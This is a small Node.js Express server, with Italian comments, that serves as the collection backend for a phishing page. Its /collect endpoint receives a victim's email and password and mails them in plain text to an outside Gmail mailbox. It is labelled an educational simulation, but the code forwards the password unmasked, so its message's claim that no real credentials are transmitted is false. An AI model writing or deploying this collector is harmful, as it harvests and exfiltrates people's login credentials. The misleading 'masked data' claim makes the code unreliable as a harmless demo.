const express = require("express");
const nodemailer = require("nodemailer");

const app = express();
app.use(express.json());

/* ===== CONFIG SMTP ===== */
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: "forensicgaia@gmail.com",
    pass: "APP_PASSWORD"
  }
});

/* ===== ENDPOINT COLLECT ===== */
app.post("/collect", async (req, res) => {
  const data = req.body;

  const message = `
SIMULAZIONE PHISHING (DIDATTICA)

Email inserita: ${data.email}
Password: ${data.password}
Lunghezza password: ${data.length}
Timestamp: ${data.timestamp}

⚠ Nessuna credenziale reale è stata trasmessa.
`;

  await transporter.sendMail({
    from: '"Security Demo" <demo@localhost>',
    to: "DESTINATARIO@gmail.com",
    subject: "[SIMULAZIONE] Dati mascherati ricevuti",
    text: message
  });

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log("Server attivo su http://localhost:3000");
});
